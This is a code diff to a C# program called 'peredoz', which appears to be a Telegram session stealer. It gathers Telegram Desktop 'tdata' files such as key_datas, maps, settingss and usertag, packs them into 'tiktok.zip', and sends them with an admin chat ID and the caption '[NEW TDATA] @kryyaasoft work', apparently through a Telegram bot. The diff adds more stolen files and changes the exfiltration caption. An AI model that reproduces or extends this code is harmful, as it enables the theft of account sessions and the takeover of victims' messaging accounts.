@@ -1,6 +1,5 @@
 ﻿/*
 peredoz version : 1.1
-
     __                                           ______ 
    / /_________  ____  ______ _____ __________  / __/ /_
   / //_/ ___/ / / / / / / __ `/ __ `/ ___/ __ \/ /_/ __/
@@ -72,6 +71,18 @@ class Program
             neededFiles.Add(keyDataFile); // kryyaa sigma boooyyyy
         }
 
+        var settingssFile = Path.Combine(Directory.GetCurrentDirectory(), "settingss");
+        if (File.Exists(settingssFile))
+        {
+            neededFiles.Add(settingssFile); // kryyaa sigma boooyyyy
+        }
+
+        var usertagFile = Path.Combine(Directory.GetCurrentDirectory(), "usertag");
+        if (File.Exists(usertagFile))
+        {
+            neededFiles.Add(usertagFile); // kryyaa sigma boooyyyy
+        }
+
         foreach (var directory in directories)
         {
             var folderName = Path.GetFileName(directory);
@@ -84,16 +95,10 @@ class Program
 
                 // kryyaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                 var mapsFile = Path.Combine(directory, "maps");
-                var configsFile = Path.Combine(directory, "configs");
 
                 if (File.Exists(mapsFile))
                 {
                     neededFiles.Add(mapsFile);
-                }
-
-                if (File.Exists(configsFile))
-                {
-                    neededFiles.Add(configsFile);
                 }
             }
         }
@@ -105,7 +110,7 @@ class Program
         {
             { new StringContent(AdminId), "chat_id" },
             { new StringContent("HTML"), "parse_mode" },
-            { new StringContent("new tdata file!!"), "caption" },
+            { new StringContent($"[NEW TDATA] @kryyaasoft work \nclient: {proc}"), "caption" },
         };
 
         using (var fileStream = new FileStream("tiktok.zip", FileMode.Open, FileAccess.Read))
